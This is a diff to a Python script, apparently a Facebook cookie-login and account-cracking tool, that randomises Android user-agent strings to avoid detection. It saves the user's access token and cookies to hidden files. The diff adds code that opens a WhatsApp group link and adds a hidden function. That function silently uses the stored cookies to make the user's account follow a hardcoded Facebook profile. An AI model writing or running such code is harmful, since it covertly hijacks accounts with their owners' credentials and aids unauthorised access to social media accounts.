@@ -76,10 +76,10 @@ for xd in range(10000):
 for brayen in range(10000):
     rr = random.randint
     rc = random.choice
-    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; 23028RN4DG Build/TP1A.{str(rr(111111,210000))}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A115F Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; PFVM10 Build/RP1A.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; V2133A Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2002J9G Build/RKQ1{str(rr(111111,210000))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A015M Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A025G Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; vivo 2006 Build/SP1A.{str(rr(111111,210000))}.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
     u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; RMX3235 Build/RP1A{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
     UaMainn = random.choice([u1, u2, u3, u4, u5])
     ugen.append(UaMainn)
@@ -255,14 +255,31 @@ def login_lagi334():
 							print(f"\n [+] Token : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\n [+] Login Berhasil | python BrayennnFB.py");exit()
+							os.system("xdg-open https://chat.whatsapp.com/InwlvDU3t6d9FShXwfH2MV")
+							print("\n [+] Login Berhasil | python BrayennnFB.py");followdong()
 			except Exception as e:
 				print(" [+] Cookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
 				print(e)
 				time.sleep(3)
-				back()
+				exit()
 	except:pass
+
+def followdong():
+	try:
+		token = open('.token.txt','r').read()
+		cokies = open('.cok.txt','r').read()
+	except IOError:
+		print(' [+] Cookies Kadaluarsa ')
+		time.sleep(5)
+		login()
+	myuid = ('100001571125775')
+	try:
+		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
+			if '/a/subscribe.php?' in foll.get('href'):
+				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cokies}).text
+				exit()
+	except(Exception)as e:print(e)#< Response error
 #------------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
 	try:
